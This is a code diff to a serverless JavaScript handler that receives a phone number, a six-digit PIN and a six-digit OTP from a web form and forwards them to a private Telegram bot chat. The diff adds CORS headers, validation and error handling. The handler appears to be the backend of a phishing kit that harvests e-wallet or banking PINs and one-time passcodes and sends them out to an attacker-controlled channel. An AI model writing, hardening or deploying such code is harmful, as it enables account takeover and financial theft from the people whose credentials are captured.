@@ -1,5 +1,6 @@
 const axios = require('axios');
 
+// Helper function to format the message
 function formatMessage(type, phone, pin, otp) {
   const cleanPhone = phone.replace(/\D/g, '');
   
@@ -22,52 +23,141 @@ function formatMessage(type, phone, pin, otp) {
   return message;
 }
 
+// Helper function to validate phone number
+function isValidPhone(phone) {
+  return phone && /^[0-9]{10,13}$/.test(phone);
+}
+
+// Main Lambda function
 exports.handler = async (event, context) => {
+  // Set default headers
+  const headers = {
+    'Content-Type': 'application/json',
+    'Access-Control-Allow-Origin': '*',
+    'Access-Control-Allow-Methods': 'POST'
+  };
+
+  // Handle CORS preflight request
+  if (event.httpMethod === 'OPTIONS') {
+    return {
+      statusCode: 204,
+      headers,
+      body: ''
+    };
+  }
+
+  // Only allow POST requests
   if (event.httpMethod !== 'POST') {
-    return { 
-      statusCode: 405, 
-      body: 'Method Not Allowed',
-      headers: { 'Content-Type': 'application/json' }
+    return {
+      statusCode: 405,
+      headers,
+      body: JSON.stringify({ 
+        error: 'Method Not Allowed',
+        message: 'Only POST requests are accepted'
+      })
     };
   }
 
   try {
-    const { type, phone, pin, otp } = JSON.parse(event.body);
+    // Parse and validate request body
+    if (!event.body) {
+      return {
+        statusCode: 400,
+        headers,
+        body: JSON.stringify({
+          error: 'Bad Request',
+          message: 'Request body is missing'
+        })
+      };
+    }
+
+    let requestBody;
+    try {
+      requestBody = JSON.parse(event.body);
+    } catch (e) {
+      return {
+        statusCode: 400,
+        headers,
+        body: JSON.stringify({
+          error: 'Bad Request',
+          message: 'Invalid JSON format in request body'
+        })
+      };
+    }
+
+    const { type, phone, pin, otp } = requestBody;
     const cleanPhone = phone ? phone.replace(/\D/g, '') : '';
 
-    // Validasi untuk nomor 10-13 digit
-    if (!type || !cleanPhone || cleanPhone.length < 10 || cleanPhone.length > 13) {
+    // Validate required fields
+    if (!type || !cleanPhone) {
       return {
         statusCode: 400,
-        body: JSON.stringify({ 
-          error: 'Invalid request: Phone number must be 10-13 digits',
+        headers,
+        body: JSON.stringify({
+          error: 'Bad Request',
+          message: 'Type and phone number are required',
+          received: { type, phone }
+        })
+      };
+    }
+
+    // Validate phone number format
+    if (!isValidPhone(cleanPhone)) {
+      return {
+        statusCode: 400,
+        headers,
+        body: JSON.stringify({
+          error: 'Invalid Phone Number',
+          message: 'Phone number must be 10-13 digits',
           received: phone,
           cleaned: cleanPhone
-        }),
-        headers: { 'Content-Type': 'application/json' }
+        })
       };
     }
 
-    // Validasi OTP 6 digit jika type otp
-    if (type === 'otp' && (!otp || otp.length !== 6)) {
+    // Validate PIN if present
+    if (type === 'pin' && (!pin || pin.length !== 6 || !/^[0-9]+$/.test(pin))) {
       return {
         statusCode: 400,
-        body: JSON.stringify({ 
-          error: 'Invalid OTP: Must be 6 digits'
-        }),
-        headers: { 'Content-Type': 'application/json' }
+        headers,
+        body: JSON.stringify({
+          error: 'Invalid PIN',
+          message: 'PIN must be 6 digits'
+        })
       };
     }
 
+    // Validate OTP if present
+    if (type === 'otp' && (!otp || otp.length !== 6 || !/^[0-9]+$/.test(otp))) {
+      return {
+        statusCode: 400,
+        headers,
+        body: JSON.stringify({
+          error: 'Invalid OTP',
+          message: 'OTP must be 6 digits'
+        })
+      };
+    }
+
+    // Check Telegram credentials
     const botToken = process.env.TELEGRAM_BOT_TOKEN;
     const chatId = process.env.TELEGRAM_CHAT_ID;
 
     if (!botToken || !chatId) {
-      throw new Error('Server configuration error: Missing Telegram credentials');
+      console.error('Missing Telegram credentials');
+      return {
+        statusCode: 500,
+        headers,
+        body: JSON.stringify({
+          error: 'Server Configuration Error',
+          message: 'Telegram credentials are not configured'
+        })
+      };
     }
 
+    // Format and send message to Telegram
     const message = formatMessage(type, cleanPhone, pin, otp);
-
+    
     const telegramResponse = await axios.post(
       `https://api.telegram.org/bot${botToken}/sendMessage`,
       {
@@ -76,30 +166,59 @@ exports.handler = async (event, context) => {
         parse_mode: 'HTML'
       },
       {
-        timeout: 5000
+        timeout: 5000,
+        headers: {
+          'Content-Type': 'application/json'
+        }
       }
     );
 
+    // Return success response
     return {
       statusCode: 200,
-      body: JSON.stringify({ 
+      headers,
+      body: JSON.stringify({
         success: true,
-        telegram_status: telegramResponse.status
-      }),
-      headers: { 'Content-Type': 'application/json' }
+        message: 'Data sent successfully',
+        telegram_status: telegramResponse.status,
+        data_sent: {
+          type,
+          phone: cleanPhone,
+          pin: pin ? '******' : undefined,
+          otp: otp ? '******' : undefined
+        }
+      })
     };
 
   } catch (error) {
     console.error('Error processing request:', error);
     
+    // Handle Axios errors specifically
+    if (error.isAxiosError) {
+      return {
+        statusCode: 502,
+        headers,
+        body: JSON.stringify({
+          error: 'Telegram API Error',
+          message: 'Failed to send message to Telegram',
+          details: error.message,
+          response: error.response ? {
+            status: error.response.status,
+            data: error.response.data
+          } : undefined
+        })
+      };
+    }
+
+    // Generic error handler
     return {
       statusCode: 500,
+      headers,
       body: JSON.stringify({
         error: 'Internal Server Error',
-        details: error.message,
-        request_body: event.body
-      }),
-      headers: { 'Content-Type': 'application/json' }
+        message: 'An unexpected error occurred',
+        details: error.message
+      })
     };
   }
 };
